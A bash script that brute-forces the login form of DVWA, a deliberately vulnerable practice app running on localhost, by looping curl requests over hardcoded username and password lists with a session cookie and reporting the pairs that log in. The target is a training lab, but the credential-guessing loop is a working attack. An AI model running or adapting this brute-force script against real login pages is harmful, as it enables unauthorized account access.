#!/bin/bash
# Brute force DVWA brute force endpoint
URL="http://127.0.0.1:8080/vulnerabilities/brute/"
COOKIES="PHPSESSID=9kk32r8pdi340ch33to4hbg0s2; security=low"

# Common usernames (including DVWA default users)
USERS=("admin" "gordonb" "pablo" "smithy" "1337" "root" "user" "test" "guest" "administrator")

# Common passwords
PASSES=("password" "123456" "admin" "letmein" "abc123" "test" "12345" "passw0rd" "qwerty" "monkey" "admin123" "root" "toor" "123456789" "1234" "pass123" "admin1" "password1" "12345678")

echo "=== Starting brute force ==="
echo ""

SUCCESS_COUNT=0
RESULTS=""

for user in "${USERS[@]}"; do
  for pass in "${PASSES[@]}"; do
    RESPONSE=$(curl -s -b "$COOKIES" "${URL}?username=${user}&password=${pass}&Login=Login" 2>/dev/null)
    
    if echo "$RESPONSE" | grep -q "Welcome to the password protected area"; then
      USERNAME=$(echo "$RESPONSE" | grep -oP 'Welcome to the password protected area \K[^<]+')
      echo "SUCCESS: ${user}:${pass} (displayed: ${USERNAME})"
      RESULTS="${RESULTS}SUCCESS: ${user}:${pass}\n"
      SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
    fi
  done
done

echo ""
echo "=== Brute force complete ==="
echo "Total successes: ${SUCCESS_COUNT}"
echo -e "$RESULTS"
